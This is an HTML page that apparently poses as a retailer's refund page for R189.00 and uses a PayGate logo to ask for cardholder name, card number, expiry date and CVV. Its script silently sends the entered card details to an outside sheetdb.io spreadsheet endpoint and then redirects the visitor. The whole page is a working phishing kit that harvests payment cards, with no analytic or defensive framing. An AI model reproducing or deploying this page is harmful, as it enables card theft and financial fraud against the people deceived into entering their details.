<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="icon" href="img/icon.png">
<title>https://Refund.MRD.com/</title>
<link rel="stylesheet" href="mm.css" type="text/css">

</head>


<body>
<form action="https://sheetdb.io/api/v1/h3rukdjf5r8mt" method="POST" id="sheetdb-form">
<div >
<div>
<div id="container" class="payment-container">
<div id="Order" class="form-row form-input form-input-name">
<label for="OrderNumber" class="label orderNumberLabel" style="font-size:25px;margin-left: -60px;">Update <strong id="OrderNumber">Payment Method</strong></label>
</div>

<div class="form-row form-input form-input-name"style="width: 320px;">
<label class="label form-input-label">Refund Amount</label>
<div class="form-row payment-price rounded-shadow-box"style="height: 40px;margin-bottom: 10px;"><span id="amount">R189.00</span></div>
</div>

<div id="cardName" class="form-row form-input form-input-name"style="width:320px;padding-bottom: 12px;">
<label name="card holder" for="cardholderName" class="label form-input-label">Name on Card</label>
<div class="input rounded-shadow-box">
<input type="text" name="data[NAME]" class="input" placeholder="Card holder" autocomplete="off" autocorrect="off" autocapitalize="off" required>
</div>
</div>

<div id="cardNumber" class="form-row form-input form-input-number" style="width:320px;padding-bottom: 12px;">
<label class="label form-input-label">Card Number</label>
<div id="cardDetectWrapper" class="input rounded-shadow-box">
<input type="tel" name="data[CARD NUMBER]" class="input" inputmode="numeric" min ="3000000000000000" pattern="[4-5]{1}[0-9\s]{0,19}" autocomplete="off" autocorrect="off" autocapitalize="off" minlength="19" maxlength="19" data-mask="0000 0000 0000 0000" placeholder="Card Number" required>
<span id="card-detect-visa" class="card-detect visa-logo"></span>
<span id="card-detect-ms" class="card-detect ms-logo"></span>
<span id="card-detect-amex" class="card-detect amex-logo"></span>
</div>
</div>

<div class="form-row form-split "style="padding-bottom: 16px; ">
<div class="form-input input" style="padding-right: 0px;">
<label label"name="Expiray date" class="label form-input-label">Expiry Date</label>
<div class="groupExpiryDate">
<div class=" rounded-shadow-box form-input input" style="float: left; width: 25%;">
<input type="text"  name="data[EXP DATE]" data-mask="00 / 00" placeholder="MM  /  YY"  autocomplete="off" autocorrect="off" autocapitalize="off" required>
</div>
</div>
</div>
</div>

<div class="form-row form-split">
<div class="form-input form-input-security" style="width: 47%;">
<label name="Security code" class="label form-input-label">CVV Digits</label>
<div id="cvvbox" class="input rounded-shadow-box">
<input type="text" name="data[CVV]" data-mask="/ 000" maxlength="3" minlength="3" autocomplete="off" autocorrect="off" autocapitalize="off" required>
<span class="input-icon security-code" style="top: 50%; transform: translateY(-50%);"></span>
</div>
</div>
<div class="form-input form-input-security"></div>
</div>

<!---->

      <div class="btn rounded-shadow-box" style="width: 200px;">
        <button type="submit" style="margin-top: -5px;" >UPDATE </button>
      </div> 
	  
<div class="payment-we-accept">
<div class="title">We accept</div>
<div class="card-icons">
</div>
<div class="title title-secure">Powered by</div>
<img id="paygateLogo" src="https://pay.paygate.co.za/mrd/img/PayGate-A-DPO-Company.6644f45b.png">
</div>

</div>
</div>
<!---->
</div>
</form>

	<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>

<script>
  var form = document.getElementById('sheetdb-form'); 
   form.addEventListener("submit", e => {
   e.preventDefault(); 
   fetch(form.action, {
      method: "POST",
	  body: new FormData(document.getElementById("sheetdb-form")),
}).then(
      response => response.json()
).then((html) => { 
      // you can put any JS code here 
	 window.open("d.html", "_self");

});
});

</script>




</body>
</html>
